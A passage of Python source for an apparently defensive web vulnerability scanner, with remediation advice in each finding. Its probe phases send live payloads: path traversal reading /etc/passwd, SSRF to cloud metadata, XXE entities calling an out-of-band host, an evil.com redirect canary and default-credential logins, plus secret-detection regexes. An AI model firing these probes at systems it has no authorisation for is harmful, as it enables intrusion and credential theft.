                add_finding(Finding(
                    title=f"CORS Misconfiguration (origin: {origin})",
                    severity=sev,
                    description=f"Server reflects arbitrary origin{' with credentials' if acac == 'true' else ''}.",
                    evidence=f"Origin: {origin}\nACAO: {acao}\nACAC: {acac}",
                    recommendation="Implement strict origin whitelist. Never combine ACAO:* with ACAC:true.",
                    phase=phase), out, cfg)
        except Exception:
            continue
    st.mark(phase)


def phase_host_header(target: str, cfg: ScanConfig, out: str, st: ScanState):
    """Test for host header injection / cache poisoning."""
    phase = "host_header"
    if st.done(phase): return
    section("Host Header Injection Probe", out)

    sess = make_session(cfg)
    canary = "webrecon-canary.example.com"
    tests = [
        {"Host": canary},
        {"Host": cfg.target, "X-Forwarded-Host": canary},
        {"Host": cfg.target, "X-Host": canary},
        {"Host": cfg.target, "X-Forwarded-Server": canary},
    ]
    for headers in tests:
        try:
            r = sess.get(cfg.base_url, headers=headers, timeout=cfg.timeout,
                         allow_redirects=False)
            loc = r.headers.get('Location', '')
            # Check reflection in body or redirect
            if canary in loc or canary in r.text[:5000]:
                add_finding(Finding(
                    title=f"Host Header Injection: {list(headers.keys())[-1]}",
                    severity=Severity.HIGH,
                    description="Host header canary reflected in response/redirect — indicates possible cache poisoning or password-reset poisoning.",
                    evidence=f"Injected headers: {headers}\nLocation: {loc}\nBody snippet: {r.text[:200]}",
                    recommendation="Validate Host/X-Forwarded-Host headers against an allowlist. Don't trust untrusted headers for URL generation.",
                    phase=phase), out, cfg)
        except Exception:
            continue
    st.mark(phase)


def phase_crlf(target: str, cfg: ScanConfig, out: str, st: ScanState):
    """Test for CRLF injection in common URL parameters."""
    phase = "crlf"
    if st.done(phase): return
    section("CRLF Injection Probe", out)

    sess = make_session(cfg)
    payloads = [
        "%0d%0aX-Injected:%20webrecon",
        "%0aX-Injected:%20webrecon",
        "%0d%0aSet-Cookie:%20webrecon=1",
        "\r\nX-Injected: webrecon",
    ]
    # Test common params + discovered params
    with DISCOVERED._lock:
        discovered_params = list(DISCOVERED.params)
    params_to_test = list(set(['redirect', 'url', 'next', 'return'] + discovered_params[:15]))

    for param in params_to_test:
        for pl in payloads:
            try:
                r = sess.get(f"{cfg.base_url}?{param}={pl}",
                             timeout=cfg.timeout, allow_redirects=False)
                if 'x-injected' in {k.lower() for k in r.headers}:
                    add_finding(Finding(
                        title=f"CRLF Injection: `{param}` parameter",
                        severity=Severity.HIGH,
                        description=f"Parameter `{param}` allows injection of arbitrary response headers.",
                        evidence=f"URL: {cfg.base_url}?{param}={pl}\nInjected header present: X-Injected",
                        recommendation="Strip CR/LF from all user input before including in HTTP response headers.",
                        phase=phase), out, cfg)
                    break
            except Exception:
                continue
    st.mark(phase)


def phase_oauth_oidc(target: str, cfg: ScanConfig, out: str, st: ScanState):
    phase = "oauth_oidc"
    if st.done(phase): return
    section("OAuth / OIDC Endpoint Enumeration", out)
    paths = [
        "/.well-known/openid-configuration",
        "/.well-known/oauth-authorization-server",
        "/.well-known/jwks.json",
        "/oauth/token", "/oauth/authorize",
        "/auth/realms/master/.well-known/openid-configuration",
        "/connect/authorize",
    ]
    sess = make_session(cfg)
    for path in paths:
        try:
            r = sess.get(f"{cfg.base_url}{path}", timeout=cfg.timeout)
            if r.status_code != 200:
                continue
            # Suppress catch-all hits
            if looks_like_catchall(cfg, r.text, len(r.content)):
                _log(out, f"\n### `{path}` — HTTP 200 *(catch-all — skipped)*")
                continue
            # Require valid JSON for OIDC config endpoints; tolerate non-JSON
            # for the rest (some servers redirect /oauth/token to a login page).
            ctype = r.headers.get('Content-Type', '').lower()
            try:
                data = r.json()
            except Exception:
                _log(out, f"\n### `{path}` — HTTP 200 (non-JSON, content-type: {ctype}) — skipped")
                continue
            _log(out, f"\n### Found: `{path}`\n```json\n{r.text[:1000]}\n```")
            add_finding(Finding(
                title=f"OAuth/OIDC Endpoint: {path}",
                severity=Severity.INFO,
                description=f"Scopes: {data.get('scopes_supported',[])} | Grants: {data.get('grant_types_supported',[])}",
                evidence=r.text[:800],
                recommendation="Disable implicit flow if unused. Review exposed scopes.",
                phase=phase), out, cfg)
        except Exception:
            continue
    st.mark(phase)


def phase_jwt_analysis(target: str, cfg: ScanConfig, out: str, st: ScanState):
    """Deep JWT analysis: alg:none, weak secrets, key confusion, kid injection."""
    phase = "jwt_analysis"
    if st.done(phase): return
    section("JWT Analysis", out)

    # Collect JWTs from findings emitted so far + session cookies + response bodies
    jwts: Set[str] = set()

    # Scan existing JS findings for JWTs
    with _findings_lock:
        for f in _findings:
            m = re.search(r'(eyJ[A-Za-z0-9_/+\-]{10,}\.[A-Za-z0-9_/+\-]{10,}\.[A-Za-z0-9_/+\-]{10,})',
                          f.evidence or '')
            if m:
                jwts.add(m.group(1))

    # Scan current cookies + response body
    sess = make_session(cfg)
    try:
        r = sess.get(cfg.base_url, timeout=cfg.timeout)
        for c in r.cookies:
            if c.value and re.match(r'^eyJ', c.value):
                jwts.add(c.value)
        # Body scan
        for m in re.finditer(r'(eyJ[A-Za-z0-9_/+\-]{10,}\.[A-Za-z0-9_/+\-]{10,}\.[A-Za-z0-9_/+\-]{10,})',
                             r.text):
            jwts.add(m.group(1))
    except Exception:
        pass

    if not jwts:
        _log(out, "> No JWTs found in cookies/body/findings.")
        st.mark(phase); return

    def _b64url_decode(s: str) -> bytes:
        s += '=' * (-len(s) % 4)
        return base64.urlsafe_b64decode(s.encode())

    for jwt in list(jwts)[:10]:
        try:
            parts = jwt.split('.')
            if len(parts) != 3: continue
            header = json.loads(_b64url_decode(parts[0]))
            payload = json.loads(_b64url_decode(parts[1]))
            _log(out, f"\n### JWT\n- Header: `{header}`\n- Payload (truncated): `{json.dumps(payload)[:300]}`")

            # alg:none
            if str(header.get('alg', '')).lower() == 'none':
                add_finding(Finding(
                    title="JWT with alg:none",
                    severity=Severity.CRITICAL,
                    description="Token accepts alg:none — signatures can be stripped.",
                    evidence=f"Header: {header}",
                    recommendation="Reject alg:none server-side. Enforce a strict allowlist of signing algorithms.",
                    phase=phase), out, cfg)

            # Weak HMAC — attempt crack with tiny wordlist
            alg = str(header.get('alg', '')).upper()
            if alg.startswith('HS'):
                import hmac as _hmac
                hash_fn = {'HS256': hashlib.sha256, 'HS384': hashlib.sha384,
                           'HS512': hashlib.sha512}.get(alg)
                if hash_fn:
                    signing_input = f"{parts[0]}.{parts[1]}".encode()
                    expected_sig = _b64url_decode(parts[2])
                    weak_secrets = ['secret', 'password', '123456', 'jwt', 'key',
                                    'changeme', 'admin', 'test', 'mykey', 'secretkey',
                                    'your-256-bit-secret', 'your_jwt_secret']
                    for secret in weak_secrets:
                        sig = _hmac.new(secret.encode(), signing_input, hash_fn).digest()
                        if _hmac.compare_digest(sig, expected_sig):
                            add_finding(Finding(
                                title=f"JWT Weak HMAC Secret: '{secret}'",
                                severity=Severity.CRITICAL,
                                description=f"JWT {alg} signature validates with trivial secret '{secret}'.",
                                evidence=f"Algorithm: {alg}\nSecret: {secret}",
                                recommendation="Rotate the signing key immediately. Use a cryptographically strong secret (>=32 random bytes).",
                                phase=phase), out, cfg)
                            break

            # kid injection hint
            if 'kid' in header:
                kid = header['kid']
                if re.search(r'[/\\\.\.]|sql|file', str(kid), re.I):
                    add_finding(Finding(
                        title="JWT Suspicious kid Header",
                        severity=Severity.MEDIUM,
                        description=f"JWT kid value contains suspicious characters — potentially probing for SQLi or path traversal: {kid}",
                        evidence=f"kid: {kid}",
                        recommendation="Validate kid strictly against expected values only.",
                        phase=phase), out, cfg)

            # Expiration check
            if 'exp' in payload:
                try:
                    exp = int(payload['exp'])
                    now = int(time.time())
                    ttl = exp - now
                    if ttl > 60 * 60 * 24 * 30:  # >30 days
                        add_finding(Finding(
                            title="JWT Excessive Lifetime",
                            severity=Severity.LOW,
                            description=f"JWT expires in {ttl//86400} days — excessive for session tokens.",
                            evidence=f"exp: {exp} (TTL: {ttl}s)",
                            recommendation="Use short-lived access tokens (<1h) with refresh tokens for long sessions.",
                            phase=phase), out, cfg)
                except Exception:
                    pass
            else:
                add_finding(Finding(
                    title="JWT Missing Expiration (exp)",
                    severity=Severity.MEDIUM,
                    description="JWT has no `exp` claim — token is valid indefinitely.",
                    evidence=f"Payload: {json.dumps(payload)[:200]}",
                    recommendation="Always include an `exp` claim on access tokens.",
                    phase=phase), out, cfg)
        except Exception as e:
            _log(out, f"> JWT parse failed: {e}")
            continue

    st.mark(phase)

# ═════════════════════════════════════════════════════════════════════════════
# PHASE 5 — VULNERABILITY SCANNING
# ═════════════════════════════════════════════════════════════════════════════

def phase_ssl_tls(target: str, cfg: ScanConfig, out: str, st: ScanState):
    phase = "ssl_tls"
    if st.done(phase): return
    section("SSL/TLS Analysis (testssl)", out)
    if _tool_ok("testssl", out):
        run_cmd(["testssl", "--color", "0", "-U", "-S", "-P", "--fast", target],
                "testssl.sh", out, cfg, 300)
    st.mark(phase)


def phase_nikto(target: str, cfg: ScanConfig, out: str, st: ScanState):
    phase = "nikto"
    if st.done(phase): return
    if cfg.no_intrusive:
        _log(out, "> Nikto skipped (--no-intrusive)."); st.mark(phase); return
    if not cfg.auto and not yes_no("Run Nikto scan?"):
        _log(out, "> Nikto skipped."); st.mark(phase); return
    section("Nikto Web Vulnerability Scan", out)
    if _tool_ok("nikto", out):
        run_cmd(["nikto", "-h", cfg.base_url, "-Tuning", "123bde",
                 "-useragent", cfg.user_agent], "Nikto", out, cfg, 900)
    st.mark(phase)


def phase_nuclei(target: str, cfg: ScanConfig, out: str, st: ScanState):
    """Nuclei template-based scanner. Replaces/augments much of Nikto's coverage."""
    phase = "nuclei"
    if st.done(phase): return
    section(f"Nuclei Template Scan ({cfg.nuclei_severity})", out)
    if not _tool_ok("nuclei", out):
        _log(out, "> nuclei not installed — `go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest`")
        st.mark(phase); return

    output_file = f"/tmp/nuclei_{hashlib.md5(target.encode()).hexdigest()}.jsonl"
    cmd = ["nuclei", "-u", cfg.base_url, "-severity", cfg.nuclei_severity,
           "-jsonl", "-o", output_file, "-silent",
           "-c", str(min(cfg.threads * 5, 25)),
           "-rate-limit", str(cfg.rate),
           "-timeout", "10"]
    if cfg.proxy:
        cmd += ["-proxy", cfg.proxy]
    if cfg.cookie:
        cmd += ["-H", f"Cookie: {cfg.cookie}"]
    for h in cfg.extra_headers:
        cmd += ["-H", h]
    if cfg.no_intrusive:
        cmd += ["-etags", "intrusive,fuzz,dos"]

    run_cmd(cmd, "nuclei scan", out, cfg, 1800)

    if os.path.exists(output_file):
        sev_map = {
            "info":     Severity.INFO,
            "low":      Severity.LOW,
            "medium":   Severity.MEDIUM,
            "high":     Severity.HIGH,
            "critical": Severity.CRITICAL,
            "unknown":  Severity.INFO,
        }
        count = 0
        with open(output_file) as fh:
            for line in fh:
                try:
                    entry = json.loads(line)
                    info = entry.get('info', {})
                    sev = sev_map.get(str(info.get('severity', 'info')).lower(),
                                      Severity.INFO)
                    name = info.get('name', entry.get('template-id', 'unknown'))
                    matched = entry.get('matched-at', entry.get('host', cfg.base_url))
                    add_finding(Finding(
                        title=f"Nuclei: {name}",
                        severity=sev,
                        description=info.get('description', name)[:500],
                        evidence=f"Matched: {matched}\nTemplate: {entry.get('template-id','')}\nTags: {info.get('tags','')}",
                        recommendation=info.get('remediation', 'See nuclei template for remediation.')[:500] if info.get('remediation') else "Review matched template for remediation guidance.",
                        phase=phase), out, cfg)
                    count += 1
                except Exception:
                    continue
        _log(out, f"\n## Nuclei Summary: {count} findings")
    st.mark(phase)


def phase_js_analysis(target: str, cfg: ScanConfig, out: str, st: ScanState):
    phase = "js_analysis"
    if st.done(phase): return
    section("JavaScript Secret Extraction", out)

    PATTERNS = {
        "AWS Access Key":   r"AKIA[0-9A-Z]{16}",
        "Generic API Key":  r"(?i)(api[_-]?key|apikey)\s*[=:]\s*['\"][a-zA-Z0-9_\-]{16,64}['\"]",
        "Generic Token":    r"(?i)(token|access_token|auth_token)\s*[=:]\s*['\"][a-zA-Z0-9_.\-]{16,}['\"]",
        "Private Key":      r"-----BEGIN (?:RSA |EC |DSA |OPENSSH )?PRIVATE KEY-----",
        "Google API Key":   r"AIza[0-9A-Za-z\-_]{35}",
        "Slack Token":      r"xox[baprs]-[0-9a-zA-Z]{10,48}",
        "GitHub Token":     r"ghp_[0-9a-zA-Z]{36}",
        "JWT":              r"eyJ[A-Za-z0-9_/+\-]{10,}\.[A-Za-z0-9_/+\-]{10,}\.[A-Za-z0-9_/+\-]{10,}",
        "Basic Auth in URL":r"https?://[a-zA-Z0-9_\-]+:[a-zA-Z0-9_\-]+@",
        "Hardcoded Password":r"(?i)(password|passwd|pwd)\s*[=:]\s*['\"][^'\"]{6,}['\"]",
        "Internal IP":      r"(?:10\.|192\.168\.|172\.(?:1[6-9]|2\d|3[01])\.)(?:\d{1,3}\.){2}\d{1,3}",
    }

    sess = make_session(cfg)
    try:
        r = sess.get(cfg.base_url, timeout=cfg.timeout)
        js_urls = set()
        for m in re.finditer(r'(?:src|href)=["\']([^"\']*\.js(?:\?[^"\']*)?)["\']', r.text, re.I):
            p = m.group(1)
            if p.startswith('http'):      js_urls.add(p)
            elif p.startswith('//'):      js_urls.add(f"https:{p}")
            else:                         js_urls.add(urljoin(cfg.base_url, p))

        # Augment with JS URLs discovered by crawler
        with DISCOVERED._lock:
            for u in DISCOVERED.urls:
                if u.endswith('.js') or '.js?' in u:
                    js_urls.add(u)

        _log(out, f"Analysing {len(js_urls)} JS files...")
        print(f"  {Fore.CYAN}ℹ Scanning {len(js_urls)} JS files for secrets")

        for js_url in list(js_urls)[:30]:
            try:
                jr = sess.get(js_url, timeout=cfg.timeout)
                if not jr.ok: continue
                for name, pat in PATTERNS.items():
                    hits = re.findall(pat, jr.text)
                    if hits:
                        add_finding(Finding(
                            title=f"Potential Secret in JS: {name}",
                            severity=Severity.HIGH,
                            description=f"Pattern `{name}` matched in `{js_url}`",
                            evidence=f"File: {js_url}\nMatches:\n" + '\n'.join(str(h)[:100] for h in hits[:5]),
                            recommendation="Remove secrets from client-side JS. Use server-side env variables.",
                            phase=phase), out, cfg)
            except Exception:
                continue
    except Exception as e:
        _log(out, f"> JS analysis failed: {e}")
    st.mark(phase)


def phase_graphql(target: str, cfg: ScanConfig, out: str, st: ScanState):
    """Detect GraphQL endpoints. Strict checks: response must be JSON
    (Content-Type AND parseable) with top-level data/errors key. This
    eliminates HTML-catch-all false positives."""
    phase = "graphql"
    if st.done(phase): return
    section("GraphQL Endpoint Detection", out)
    paths = ["/graphql", "/api/graphql", "/v1/graphql", "/graphiql",
             "/playground", "/graphql/console", "/api/v1/graphql"]
    sess = make_session(cfg)
    for path in paths:
        url = f"{cfg.base_url}{path}"
        try:
            r = sess.post(url, json={"query": "{__schema{queryType{name}}}"},
                          timeout=cfg.timeout)
            if r.status_code not in (200, 201, 400, 403):
                continue
            # Catch-all suppression
            if r.status_code in (200, 201) and looks_like_catchall(cfg, r.text, len(r.content)):
                _log(out, f"- `{path}` HTTP {r.status_code} (catch-all — skipped)")
                continue
            # Require JSON content-type
            ctype = r.headers.get('Content-Type', '').lower()
            if 'json' not in ctype:
                _log(out, f"- `{path}` HTTP {r.status_code} (non-JSON: {ctype}) — skipped")
                continue
            # Must parse as JSON
            try:
                data = r.json()
            except Exception:
                _log(out, f"- `{path}` HTTP {r.status_code} (JSON parse failed) — skipped")
                continue
            # Must have GraphQL-shaped response: top-level 'data' or 'errors'
            if not isinstance(data, dict) or not ({'data', 'errors'} & set(data.keys())):
                _log(out, f"- `{path}` HTTP {r.status_code} (JSON but no data/errors key) — skipped")
                continue

            # Now we're confident it's GraphQL — assess introspection
            introspection_works = (
                'data' in data and
                isinstance(data.get('data'), dict) and
                '__schema' in str(data.get('data', {}))
            )
            sev = Severity.MEDIUM if introspection_works else Severity.LOW
            desc = (f"GraphQL endpoint at {url}. "
                    f"{'Introspection enabled.' if introspection_works else 'Introspection appears disabled.'}")
            add_finding(Finding(
                title=f"GraphQL Endpoint: {path}",
                severity=sev,
                description=desc,
                evidence=f"POST {url} → HTTP {r.status_code}\nContent-Type: {ctype}\n{r.text[:600]}",
                recommendation=("Disable introspection in production. Add depth/complexity limits and auth."
                                if introspection_works else
                                "Verify introspection is disabled in production. Add auth + rate-limiting."),
                phase=phase), out, cfg)
        except Exception:
            continue
    st.mark(phase)


def phase_path_traversal(target: str, cfg: ScanConfig, out: str, st: ScanState):
    phase = "path_traversal"
    if st.done(phase): return
    section("Path Traversal Probe", out)
    payloads = ["../etc/passwd", "../../etc/passwd", "....//....//etc/passwd",
                "..%2fetc%2fpasswd", "%2e%2e%2fetc%2fpasswd", "../windows/win.ini"]
    indicators = ["root:x:0:0", "daemon:", "[extensions]", "bin/bash"]
    sess = make_session(cfg)
    for pl in payloads:
        try:
            r = sess.get(f"{cfg.base_url}/{pl}", timeout=cfg.timeout, allow_redirects=False)
            for ind in indicators:
                if ind in r.text:
                    add_finding(Finding(
                        title="Path Traversal Vulnerability",
                        severity=Severity.CRITICAL,
                        description="Path traversal payload returned sensitive file contents.",
                        evidence=f"Payload: {pl}\nHTTP {r.status_code}\nIndicator: {ind}\n{r.text[:400]}",
                        recommendation="Sanitise path inputs. Use allowlists. Avoid passing user input to filesystem calls.",
                        phase=phase), out, cfg)
                    break
        except Exception:
            continue

    # Also test discovered params for path traversal
    with DISCOVERED._lock:
        params = list(DISCOVERED.params)[:10]
    for param in params:
        for pl in payloads[:3]:
            try:
                r = sess.get(f"{cfg.base_url}?{param}={pl}", timeout=cfg.timeout)
                for ind in indicators:
                    if ind in r.text:
                        add_finding(Finding(
                            title=f"Path Traversal via `{param}`",
                            severity=Severity.CRITICAL,
                            description=f"Parameter `{param}` is vulnerable to path traversal.",
                            evidence=f"URL: {cfg.base_url}?{param}={pl}\nIndicator: {ind}",
                            recommendation="Validate/canonicalise path inputs. Use allowlists.",
                            phase=phase), out, cfg)
                        break
            except Exception:
                continue
    st.mark(phase)


def phase_open_redirect(target: str, cfg: ScanConfig, out: str, st: ScanState):
    phase = "open_redirect"
    if st.done(phase): return
    section("Open Redirect Probe", out)
    params = ["redirect", "url", "next", "return", "returnUrl", "goto",
              "destination", "continue", "redir", "redirect_uri", "target"]
    # Augment with discovered params
    with DISCOVERED._lock:
        params = list(set(params + [p for p in DISCOVERED.params
                                     if any(k in p.lower() for k in
                                            ('redirect', 'url', 'return', 'next', 'goto'))]))
    canary = "https://evil.com/openredirect-canary"
    sess = make_session(cfg)
    for param in params:
        try:
            r = sess.get(f"{cfg.base_url}?{param}={canary}",
                         timeout=cfg.timeout, allow_redirects=False)
            if "evil.com" in r.headers.get("Location", ""):
                add_finding(Finding(
                    title=f"Open Redirect: `{param}` parameter",
                    severity=Severity.MEDIUM,
                    description=f"Parameter `{param}` reflects external URL in Location header.",
                    evidence=f"URL: {cfg.base_url}?{param}={canary}\nLocation: {r.headers.get('Location')}",
                    recommendation="Validate redirect targets against an allowlist of permitted domains.",
                    phase=phase), out, cfg)
        except Exception:
            continue
    st.mark(phase)


def phase_ssrf(target: str, cfg: ScanConfig, out: str, st: ScanState):
    """OOB-based SSRF probe across discovered parameters."""
    phase = "ssrf"
    if st.done(phase): return
    section("SSRF Probe", out)
    if not cfg.oob_url:
        _log(out, "> SSRF skipped — no --oob-url provided.")
        print(f"  {Fore.YELLOW}⚠ SSRF skipped — provide --oob-url")
        st.mark(phase); return

    sess = make_session(cfg)

    # Common SSRF-prone parameter names
    common = ['url', 'uri', 'path', 'src', 'dest', 'redirect', 'target', 'host',
              'site', 'file', 'document', 'page', 'feed', 'image', 'load',
              'fetch', 'proxy', 'callback', 'link', 'ref']

    with DISCOVERED._lock:
        discovered = list(DISCOVERED.params)
    params = list(set(common + discovered))[:30]

    hits_sent = 0
    for param in params:
        marker = hashlib.md5(param.encode()).hexdigest()[:8]
        payload = f"http://{marker}.{cfg.oob_url}/"
        # Test as GET parameter
        try:
            sess.get(f"{cfg.base_url}?{param}={payload}",
                     timeout=cfg.timeout, allow_redirects=False)
            hits_sent += 1
        except Exception:
            pass
        # Test as JSON body against discovered endpoints
        for ep in list(DISCOVERED.endpoints)[:5]:
            try:
                url = urljoin(cfg.base_url, ep)
                sess.post(url, json={param: payload},
                          timeout=cfg.timeout)
                hits_sent += 1
            except Exception:
                continue

    # Cloud metadata sweep
    metadata_targets = [
        "http://169.254.169.254/latest/meta-data/",     # AWS
        "http://169.254.169.254/computeMetadata/v1/",   # GCP
        "http://metadata.google.internal/",             # GCP
        "http://169.254.169.254/metadata/v1/",          # DigitalOcean
        "file:///etc/passwd",
    ]
    for meta in metadata_targets:
        for param in ('url', 'uri', 'src'):
            try:
                r = sess.get(f"{cfg.base_url}?{param}={meta}",
                             timeout=cfg.timeout)
                if any(s in r.text for s in ('ami-id', 'iam/security-credentials',
                                              'instance-id', 'root:x:0:0')):
                    add_finding(Finding(
                        title=f"SSRF to Cloud Metadata via `{param}`",
                        severity=Severity.CRITICAL,
                        description=f"Parameter `{param}` fetches cloud metadata service.",
                        evidence=f"URL: {cfg.base_url}?{param}={meta}\nResponse: {r.text[:300]}",
                        recommendation="Block outbound requests to link-local metadata IPs. Use IMDSv2 (AWS). Validate URL scheme/host.",
                        phase=phase), out, cfg)
            except Exception:
                continue

    add_finding(Finding(
        title=f"SSRF OOB Probes Sent ({hits_sent} requests)",
        severity=Severity.INFO,
        description=f"SSRF payloads with marker-prefixed subdomains sent. Monitor {cfg.oob_url} for DNS/HTTP callbacks.",
        evidence=f"OOB base: {cfg.oob_url}\nParameters tested: {len(params)}",
        recommendation="Correlate DNS callbacks by the 8-char marker prefix → parameter name.",
        phase=phase), out, cfg)
    st.mark(phase)


def phase_ssti(target: str, cfg: ScanConfig, out: str, st: ScanState):
    """Server-side template injection detection across discovered parameters.

    Uses a DIFFERENTIAL approach to eliminate false positives:
      1. Baseline:        param=__webrecon_canary__   → record response
      2. Probe payload:   param={{31337*1337}}        → expect '41897569'
      3. Control payload: param={{31337*1338}}        → expect '41928906'
    Both numbers are 8-digit primes-ish that don't appear in real HTML by
    chance. Fires a finding ONLY if:
      - probe response contains the probe result (e.g. '41897569')
      - probe response does NOT contain the control result (eliminates pages
        that just dump everything)
      - control response contains the control result OR neither result (i.e.
        results aren't being statically returned regardless of input)
      - probe response differs from baseline (eliminates static catch-all)
    """
    phase = "ssti"
    if st.done(phase): return
    section("SSTI Probe", out)
    sess = make_session(cfg)

    # Each entry: (probe_payload, probe_result, control_payload, control_result, engine)
    # Numbers chosen to be distinctive and not collide with timestamps, IDs etc.
    PROBES = [
        ("{{31337*1337}}",     "41897569", "{{31337*1338}}",     "41928906", "Jinja2/Twig"),
        ("${31337*1337}",      "41897569", "${31337*1338}",      "41928906", "FreeMarker/JSP-EL"),
        ("<%= 31337*1337 %>",  "41897569", "<%= 31337*1338 %>",  "41928906", "ERB/EJS"),
        ("#{31337*1337}",      "41897569", "#{31337*1338}",      "41928906", "Ruby/Thymeleaf"),
        ("${{31337*1337}}",    "41897569", "${{31337*1338}}",    "41928906", "Handlebars-like"),
        ("@(31337*1337)",      "41897569", "@(31337*1338)",      "41928906", "Razor"),
    ]

    common = ['name', 'search', 'query', 'q', 'msg', 'message', 'greeting',
              'title', 'content', 'input', 'text']
    with DISCOVERED._lock:
        discovered = list(DISCOVERED.params)
    params = list(set(common + discovered))[:20]

    canary_value = "__webrecon_ssti_canary__"

    for param in params:
        # Step 1: baseline with a canary value
        try:
            base = sess.get(f"{cfg.base_url}?{param}={canary_value}",
                            timeout=cfg.timeout)
            baseline_text = base.text
        except Exception:
            continue

        for probe_pl, probe_res, control_pl, control_res, engine in PROBES:
            try:
                # Step 2: the actual SSTI probe
                pr = sess.get(f"{cfg.base_url}?{param}={probe_pl}",
                              timeout=cfg.timeout)
                probe_text = pr.text

                # Quick fail: probe result not in response → no SSTI
                if probe_res not in probe_text:
                    continue

                # Quick fail: probe result was already in baseline → coincidence
                if probe_res in baseline_text:
                    continue

                # Step 3: differential check with control payload
                cr = sess.get(f"{cfg.base_url}?{param}={control_pl}",
                              timeout=cfg.timeout)
                control_text = cr.text

                # If probe response also contains the control result, the page
                # is reflecting both / dumping data. Not real SSTI.
                if control_res in probe_text:
                    continue

                # Control payload should produce its own result (templated)
                # OR the page should differ from baseline
                control_evaluated = control_res in control_text
                differs_from_baseline = abs(len(probe_text) - len(baseline_text)) > 8

                if not (control_evaluated or differs_from_baseline):
                    continue

                add_finding(Finding(
                    title=f"SSTI ({engine}) via `{param}`",
                    severity=Severity.CRITICAL,
                    description=(f"Parameter `{param}` evaluates template expressions ({engine}). "
                                 f"Differential check confirmed: probe '{probe_pl}' produced "
                                 f"'{probe_res}', control '{control_pl}' produced "
                                 f"'{control_res}'."),
                    evidence=(f"Param: {param}\n"
                              f"Probe payload:   {probe_pl} → '{probe_res}' present\n"
                              f"Control payload: {control_pl} → '{control_res}' "
                              f"{'present' if control_evaluated else 'absent'}\n"
                              f"Baseline contained probe result: {probe_res in baseline_text}\n"
                              f"URL: {cfg.base_url}?{param}={probe_pl}"),
                    recommendation="Never pass user input to template engines as template code. Use parameterised rendering (context data only).",
                    phase=phase), out, cfg)
                break
            except Exception:
                continue
    st.mark(phase)


def phase_xxe(target: str, cfg: ScanConfig, out: str, st: ScanState):
    """Enhanced XXE: multiple content types, parameter-entity blind payload."""
    phase = "xxe"
    if st.done(phase): return
    section("XXE Probe", out)
    if not cfg.oob_url:
        _log(out, "> XXE skipped — no --oob-url provided.")
        print(f"  {Fore.YELLOW}⚠ XXE skipped — provide --oob-url")
        st.mark(phase); return

    # Classic external entity
    payload_classic = (f'<?xml version="1.0"?>\n'
                       f'<!DOCTYPE x [<!ENTITY xxe SYSTEM "http://{cfg.oob_url}/xxe-classic">]>\n'
                       f'<root><data>&xxe;</data></root>')

    # Parameter-entity blind (defeats many modern parsers that disable external entities
    # but not external DTDs)
    payload_blind = (f'<?xml version="1.0"?>\n'
                     f'<!DOCTYPE x [<!ENTITY % xxe SYSTEM "http://{cfg.oob_url}/xxe-blind-dtd">%xxe;]>\n'
                     f'<root/>')

    # SOAP envelope
    payload_soap = (f'<?xml version="1.0"?>\n'
                    f'<!DOCTYPE x [<!ENTITY xxe SYSTEM "http://{cfg.oob_url}/xxe-soap">]>\n'
                    f'<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">\n'
                    f'<soap:Body><data>&xxe;</data></soap:Body></soap:Envelope>')

    # SVG-embedded XXE
    payload_svg = (f'<?xml version="1.0"?>\n'
                   f'<!DOCTYPE svg [<!ENTITY xxe SYSTEM "http://{cfg.oob_url}/xxe-svg">]>\n'
                   f'<svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>')

    tests = [
        (payload_classic, "application/xml"),
        (payload_blind,   "application/xml"),
        (payload_soap,    "text/xml"),
        (payload_soap,    "application/soap+xml"),
        (payload_svg,     "image/svg+xml"),
    ]

    sess = make_session(cfg)
    # Test against discovered endpoints + common API paths
    with DISCOVERED._lock:
        endpoints = list(DISCOVERED.endpoints)[:10]
    paths = ["/api/", "/api/v1/", "/upload", "/import", "/xml", "/soap",
             "/parse", "/svg"] + endpoints

    for path in paths:
        for payload, content_type in tests:
            try:
                url = urljoin(cfg.base_url, path)
                sess.post(url, data=payload,
                          headers={"Content-Type": content_type},
                          timeout=cfg.timeout)
            except Exception:
                continue

    add_finding(Finding(
        title="XXE Probes Sent (classic + blind + SOAP + SVG)",
        severity=Severity.INFO,
        description=f"XXE payloads sent across {len(paths)} endpoints and {len(tests)} content-type variants. Monitor {cfg.oob_url} for DNS/HTTP callbacks.",
        evidence="Markers: xxe-classic, xxe-blind-dtd, xxe-soap, xxe-svg",
        recommendation="Disable external entity & external DTD processing in all XML parsers (defusedxml / feature flags).",
        phase=phase), out, cfg)
    st.mark(phase)


def phase_default_creds(target: str, cfg: ScanConfig, out: str, st: ScanState):
    """Fixed: success logic rewritten as explicit branches per auth type."""
    phase = "default_creds"
    if st.done(phase): return
    section("Default Credential Testing", out)

    # (indicator_path, login_path, auth_type, user_field, pass_field, user, pwd, success_text, failure_text)
    PLATFORMS = [
        ("/manager/html",  "/manager/html",           "basic", None, None, "tomcat",  "s3cret",  "Tomcat Web Application Manager", None),
        ("/manager/html",  "/manager/html",           "basic", None, None, "admin",   "admin",   "Tomcat Web Application Manager", None),
        ("/manager/html",  "/manager/html",           "basic", None, None, "tomcat",  "tomcat",  "Tomcat Web Application Manager", None),
        ("/j_acegi_security_check", "/j_acegi_security_check", "form", "j_username", "j_password", "admin", "admin", None, "loginError"),
        ("/wp-login.php",  "/wp-login.php",           "form", "log", "pwd", "admin", "admin", "wp-admin", "login_error"),
        ("/api/login",     "/api/login",              "json", "user", "password", "admin", "admin", None, None),  # Grafana-like
    ]

    sess = make_session(cfg)

    for indicator, login_path, auth_type, uf, pf, user, pwd, success_text, failure_text in PLATFORMS:
        # Confirm target exposes the platform
        try:
            check = sess.get(f"{cfg.base_url}{indicator}", timeout=cfg.timeout,
                             allow_redirects=False)
            if check.status_code not in (200, 302, 401, 403):
                continue
        except Exception:
            continue

        login_url = f"{cfg.base_url}{login_path}"
        success = False
        evidence = ""

        try:
            if auth_type == "basic":
                # Must have been 401 without creds AND 200 with creds
                if check.status_code != 401:
                    continue
                r = sess.get(login_url, auth=(user, pwd), timeout=cfg.timeout,
                             allow_redirects=False)
                success = (r.status_code == 200 and
                           (not success_text or success_text.lower() in r.text.lower()))
                evidence = f"GET {login_url} (basic auth) → HTTP {r.status_code}"

            elif auth_type == "form":
                if uf is None or pf is None:
                    continue
                r = sess.post(login_url, data={uf: user, pf: pwd},
                              timeout=cfg.timeout, allow_redirects=True)
                # Success = expected text present AND failure text absent
                body = r.text.lower()
